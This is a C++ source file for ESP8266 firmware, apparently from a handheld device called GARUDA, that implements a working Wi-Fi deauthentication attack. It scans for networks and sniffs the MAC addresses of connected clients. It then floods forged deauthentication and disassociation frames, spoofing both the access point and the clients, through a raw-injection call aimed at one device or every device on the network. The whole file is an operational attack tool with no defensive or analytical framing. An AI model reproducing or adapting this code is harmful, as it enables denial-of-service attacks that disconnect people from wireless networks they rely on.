#include "deauthAttack.h"
#include "inputnodes.h"

extern "C" {
#include <user_interface.h>
#include <ieee80211.h>
}

// ==================== File-scope globals ====================
// These must be accessible from the C-linkage promiscuous callback

static uint8_t g_targetBSSID[6];
static int g_targetChannel = 0;
static String g_targetSSID;

static uint8_t g_clients[MAX_CLIENTS][6];
static volatile int g_clientCount = 0;

// ==================== Static class members ====================

Adafruit_SSD1306 *deauthAttack::displayVar = nullptr;
int deauthAttack::_networksFound = 0;
int deauthAttack::_selected = 0;
int deauthAttack::_top = 0;
DeauthPhase deauthAttack::_phase = PHASE_NETWORK_SELECT;
int deauthAttack::_selectedNetwork = -1;
int deauthAttack::_clientSelected = 0;
int deauthAttack::_clientTop = 0;

// ==================== Helper functions ====================

static bool isBroadcastOrZero(const uint8_t *mac) {
  static const uint8_t bcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  static const uint8_t zero[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  return (memcmp(mac, bcast, 6) == 0) || (memcmp(mac, zero, 6) == 0);
}

static void addClient(const uint8_t *mac) {
  if (g_clientCount >= MAX_CLIENTS)
    return;
  if (isBroadcastOrZero(mac))
    return;
  if (memcmp(mac, g_targetBSSID, 6) == 0)
    return; // Skip the AP itself

  for (int i = 0; i < g_clientCount; i++) {
    if (memcmp(g_clients[i], mac, 6) == 0)
      return; // Already known
  }

  memcpy(g_clients[g_clientCount], mac, 6);
  g_clientCount++;
}

static String macToString(const uint8_t *mac) {
  char buf[18];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3],
          mac[4], mac[5]);
  return String(buf);
}

// ==================== Promiscuous callback ====================
// Called by the ESP8266 SDK for every received 802.11 frame.
// buf layout: 12-byte RxControl header, then the 802.11 frame.

static void ICACHE_FLASH_ATTR promiscCb(uint8_t *buf, uint16_t len) {
  if (len <= 12)
    return; // RxControl only, no frame data
  if (g_clientCount >= MAX_CLIENTS)
    return;

  uint8_t *frame = buf + 12; // Skip RxControl header

  // 802.11 MAC header: ADDR1 @ offset 4, ADDR2 @ offset 10
  uint8_t *addr1 = frame + 4;  // Receiver / Destination
  uint8_t *addr2 = frame + 10; // Transmitter / Source

  // Only care about frames involving our target AP
  bool a1IsAP = (memcmp(addr1, g_targetBSSID, 6) == 0);
  bool a2IsAP = (memcmp(addr2, g_targetBSSID, 6) == 0);

  if (!a1IsAP && !a2IsAP)
    return;

  // The address that ISN'T the AP is a client
  if (!a1IsAP)
    addClient(addr1);
  if (!a2IsAP)
    addClient(addr2);
}

// Dummy callback used during attack phase (we don't need to sniff)
static void dummyPromiscCb(uint8_t *buf, uint16_t len) {
  (void)buf;
  (void)len;
}

// ==================== Frame templates ====================

// Deauthentication frame (Type 0xC0)
static uint8_t deauth_frame[26] = {
    0xc0, 0x00,                         // Type: Deauth
    0x3a, 0x01,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // ADDR1: Destination     (byte 4)
    0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, // ADDR2: Source          (byte 10)
    0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, // ADDR3: BSSID           (byte 16)
    0x00, 0x00,                         // Sequence Number        (byte 22)
    0x07, 0x00                          // Reason Code 7
};

// Disassociation frame (Type 0xA0)
static uint8_t disassoc_frame[26] = {
    0xa0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
    0xcc, 0xcc, 0xcc, 0xcc, 0x00, 0x00, 0x08, 0x00 // Reason Code 8
};

// ==================== Class implementation ====================

deauthAttack::deauthAttack(Adafruit_SSD1306 *displayHandle) {
  displayVar = displayHandle;
}

void deauthAttack::init() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  system_phy_set_max_tpw(40);
  delay(100);

  wifi_set_opmode(STATION_MODE);

  _phase = PHASE_NETWORK_SELECT;

  // Button callbacks (shared across all phases, dispatch by _phase)
  buttonUp.attachClick(deauthAttack::handleNavigateUp);
  buttonDown.attachClick(deauthAttack::handleNavigateDown);
  buttonSelect.attachClick(deauthAttack::handleSelection);
}

// ==================== Navigation handlers ====================

void deauthAttack::handleNavigateUp() {
  if (_phase == PHASE_NETWORK_SELECT) {
    if (_selected > 0) {
      _selected--;
      if (_selected < _top)
        _top--;
      render();
    }
  } else if (_phase == PHASE_CLIENT_SELECT) {
    // Total entries = g_clientCount + 1 (index 0 is "ALL CLIENTS")
    if (_clientSelected > 0) {
      _clientSelected--;
      if (_clientSelected < _clientTop)
        _clientTop--;
      renderClients();
    }
  }
}

void deauthAttack::handleNavigateDown() {
  if (_phase == PHASE_NETWORK_SELECT) {
    if (_selected < _networksFound - 1) {
      _selected++;
      if (_selected >= _top + 4)
        _top++;
      render();
    }
  } else if (_phase == PHASE_CLIENT_SELECT) {
    // Total entries = g_clientCount + 1 (index 0 is "ALL CLIENTS")
    int totalEntries = g_clientCount + 1;
    if (_clientSelected < totalEntries - 1) {
      _clientSelected++;
      if (_clientSelected >= _clientTop + 3)
        _clientTop++;
      renderClients();
    }
  }
}

void deauthAttack::handleSelection() {
  if (_phase == PHASE_NETWORK_SELECT && _networksFound > 0) {
    _selectedNetwork = _selected;
    scanClients(_selectedNetwork);
  } else if (_phase == PHASE_CLIENT_SELECT && g_clientCount > 0 &&
             !isInAttackMode) {
    // _clientSelected == 0 means "ALL CLIENTS"
    // _clientSelected >= 1 means a specific client (g_clients[_clientSelected - 1])
    runAttack(_clientSelected);
  }
}

// ==================== WiFi network scan ====================

void deauthAttack::scan() {
  _phase = PHASE_NETWORK_SELECT;
  displayVar->clearDisplay();
  displayVar->setCursor(0, 0);
  displayVar->println(F("Scanning WiFi..."));
  displayVar->display();

  _networksFound = WiFi.scanNetworks();
  _selected = 0;
  _top = 0;
  render();
}

void deauthAttack::render() {
  if (displayVar == nullptr)
    return;
  displayVar->clearDisplay();
  displayVar->setTextSize(1);
  displayVar->setTextColor(SSD1306_WHITE);
  displayVar->setCursor(0, 0);

  if (_networksFound <= 0) {
    displayVar->println(F("No networks found."));
  } else {
    displayVar->print(F("Select WiFi ("));
    displayVar->print(_networksFound);
    displayVar->println(F(")"));
    displayVar->println(F("---------------------"));

    for (int i = 0; i < 4; i++) {
      int idx = _top + i;
      if (idx >= _networksFound)
        break;
      displayVar->print(idx == _selected ? "> " : "  ");
      displayVar->print(idx + 1);
      displayVar->print(F(". "));
      displayVar->println(WiFi.SSID(idx));
    }
  }
  displayVar->display();
}

// ==================== Client sniffing ====================

void deauthAttack::scanClients(int networkIndex) {
  _phase = PHASE_CLIENT_SCAN;
  g_clientCount = 0;

  // Cache target info before changing WiFi mode
  uint8_t *bssid = WiFi.BSSID(networkIndex);
  if (bssid == nullptr) {
    _phase = PHASE_NETWORK_SELECT;
    render();
    return;
  }
  memcpy(g_targetBSSID, bssid, 6);
  g_targetChannel = WiFi.channel(networkIndex);
  g_targetSSID = WiFi.SSID(networkIndex);

  // Show scanning UI
  displayVar->clearDisplay();
  displayVar->setCursor(0, 0);
  displayVar->println(F("Sniffing clients..."));
  displayVar->print(F("AP: "));
  displayVar->println(g_targetSSID);
  displayVar->print(F("Ch: "));
  displayVar->println(g_targetChannel);
  displayVar->println(F("---------------------"));
  displayVar->println(F("Clients found: 0"));
  displayVar->println(F(""));
  displayVar->println(F("Press SEL to stop"));
  displayVar->display();

  Serial.print(F("Sniffing on CH "));
  Serial.print(g_targetChannel);
  Serial.print(F(" for AP: "));
  Serial.println(macToString(g_targetBSSID));

  // Enter promiscuous mode on target channel
  WiFi.disconnect();
  delay(50);
  wifi_set_channel(g_targetChannel);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(promiscCb);
  wifi_promiscuous_enable(1);

  // Sniff for up to 15 seconds
  unsigned long startTime = millis();
  int lastCount = -1;
  bool stopped = false;

  while (!stopped && (millis() - startTime < 15000)) {
    // Check select button to stop early (direct pin read since
    // we're in a blocking loop and OneButton callbacks won't help)
    if (digitalRead(BUTTON_SELECT) == LOW) {
      delay(50);
      if (digitalRead(BUTTON_SELECT) == LOW) {
        stopped = true;
        while (digitalRead(BUTTON_SELECT) == LOW) {
          yield();
          delay(10);
        }
      }
    }

    // Update display when new clients are discovered
    if (g_clientCount != lastCount) {
      lastCount = g_clientCount;
      displayVar->fillRect(0, 32, 128, 10, SSD1306_BLACK);
      displayVar->setCursor(0, 32);
      displayVar->print(F("Clients found: "));
      displayVar->print(g_clientCount);
      displayVar->display();

      Serial.print(F("Client #"));
      Serial.print(g_clientCount);
      Serial.print(F(": "));
      Serial.println(macToString(g_clients[g_clientCount - 1]));
    }

    yield();
    delay(10);
  }

  // Done sniffing
  wifi_promiscuous_enable(0);

  Serial.print(F("Scan complete. Total clients: "));
  Serial.println(g_clientCount);

  // Transition to client selection
  _clientSelected = 0;
  _clientTop = 0;
  _phase = PHASE_CLIENT_SELECT;
  renderClients();
}

// ==================== Client list UI ====================

void deauthAttack::renderClients() {
  if (displayVar == nullptr)
    return;
  displayVar->clearDisplay();
  displayVar->setTextSize(1);
  displayVar->setTextColor(SSD1306_WHITE);
  displayVar->setCursor(0, 0);

  if (g_clientCount <= 0) {
    displayVar->println(F("No clients found!"));
    displayVar->println(F(""));
    displayVar->println(F("No devices active on"));
    displayVar->println(F("this network."));
    displayVar->println(F(""));
    displayVar->println(F("Hold SEL = back"));
  } else {
    displayVar->print(F("Clients ("));
    displayVar->print(g_clientCount);
    displayVar->println(F(")"));
    displayVar->println(F("---------------------"));

    // Total entries: 1 ("ALL") + g_clientCount individual MACs
    int totalEntries = g_clientCount + 1;
    for (int i = 0; i < 3; i++) {
      int idx = _clientTop + i;
      if (idx >= totalEntries)
        break;
      displayVar->print(idx == _clientSelected ? ">" : " ");
      if (idx == 0) {
        displayVar->println(F("** ALL CLIENTS **"));
      } else {
        displayVar->println(macToString(g_clients[idx - 1]));
      }
    }

    displayVar->setCursor(0, 56);
    displayVar->print(F("SEL=attack  HOLD=back"));
  }
  displayVar->display();
}

// ==================== Targeted deauth attack ====================

// Helper: set up frames for a specific client MAC
static void prepareFrames(uint8_t *clientMAC, const uint8_t *apMAC,
                          uint8_t *reverse) {
  // AP → Client deauth
  memcpy(&deauth_frame[4], clientMAC, 6);  // ADDR1: Client (dest)
  memcpy(&deauth_frame[10], apMAC, 6);     // ADDR2: AP     (src)
  memcpy(&deauth_frame[16], apMAC, 6);     // ADDR3: BSSID

  // AP → Client disassoc
  memcpy(&disassoc_frame[4], clientMAC, 6);
  memcpy(&disassoc_frame[10], apMAC, 6);
  memcpy(&disassoc_frame[16], apMAC, 6);

  // Client → AP deauth (reverse)
  memcpy(reverse, deauth_frame, 26);
  memcpy(&reverse[4], apMAC, 6);       // ADDR1: AP     (dest)
  memcpy(&reverse[10], clientMAC, 6);  // ADDR2: Client (src)
  memcpy(&reverse[16], apMAC, 6);      // ADDR3: BSSID
}

void deauthAttack::runAttack(int clientIndex) {
  // clientIndex == 0  →  ALL CLIENTS
  // clientIndex >= 1  →  specific client at g_clients[clientIndex - 1]
  bool attackAll = (clientIndex == 0);

  // Display attack info
  displayVar->clearDisplay();
  displayVar->setCursor(0, 0);
  displayVar->println(F("DEAUTH ACTIVE"));
  displayVar->println(F("---------------------"));
  displayVar->print(F("AP:  "));
  displayVar->println(g_targetSSID);
  displayVar->print(F("CLI: "));
  if (attackAll) {
    displayVar->print(F("ALL ("));
    displayVar->print(g_clientCount);
    displayVar->println(F(")"));
    Serial.println(F("Attacking ALL clients"));
  } else {
    displayVar->println(macToString(g_clients[clientIndex - 1]));
    Serial.print(F("Attacking client: "));
    Serial.println(macToString(g_clients[clientIndex - 1]));
  }
  displayVar->print(F("Ch:  "));
  displayVar->println(g_targetChannel);
  displayVar->println(F("Hold SEL to Stop"));
  displayVar->display();

  // Set channel and enable promiscuous mode for TX
  wifi_set_channel(g_targetChannel);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(dummyPromiscCb);
  wifi_promiscuous_enable(1);

  _phase = PHASE_ATTACKING;
  isInAttackMode = true;

  uint16_t seq_num = 0;
  unsigned long packetCount = 0;
  int currentClient = 0; // round-robin index for ALL mode
  uint8_t deauth_reverse[26];

  // If single target, prepare frames once
  if (!attackAll) {
    prepareFrames(g_clients[clientIndex - 1], g_targetBSSID, deauth_reverse);
  }

  // Attack loop
  while (isInAttackMode) {
    buttonSelect.tick();

    // In ALL mode, cycle to the next client each iteration
    if (attackAll) {
      prepareFrames(g_clients[currentClient], g_targetBSSID, deauth_reverse);
      currentClient = (currentClient + 1) % g_clientCount;
    }

    // Update sequence number across all frames
    uint16_t sc = (seq_num << 4);
    deauth_frame[22] = sc & 0xFF;
    deauth_frame[23] = (sc >> 8) & 0xFF;
    disassoc_frame[22] = sc & 0xFF;
    disassoc_frame[23] = (sc >> 8) & 0xFF;
    deauth_reverse[22] = sc & 0xFF;
    deauth_reverse[23] = (sc >> 8) & 0xFF;

    // Send burst: AP→Client deauth, Client→AP deauth, AP→Client disassoc
    // Using the patched ieee80211_freedom_output for guaranteed injection
    uint8_t iface = wifi_get_broadcast_if();
    ieee80211_freedom_output(iface, deauth_frame, 26, 0);
    ieee80211_freedom_output(iface, deauth_reverse, 26, 0);
    ieee80211_freedom_output(iface, disassoc_frame, 26, 0);

    seq_num = (seq_num + 1) % 4096;
    packetCount += 3;

    // Update packet counter on display
    if (packetCount % 99 == 0) {
      displayVar->fillRect(0, 54, 128, 10, SSD1306_BLACK);
      displayVar->setCursor(0, 54);
      displayVar->print(F("Pkts: "));
      displayVar->print(packetCount);
      displayVar->display();
    }

    yield();
    delay(1);
  }

  // Clean up
  wifi_promiscuous_enable(0);
  _phase = PHASE_NETWORK_SELECT;

  // NOTE: exitAttackMode() in GARUDA.ino already handles
  // UI transition back to main menu, so no render() call here.
}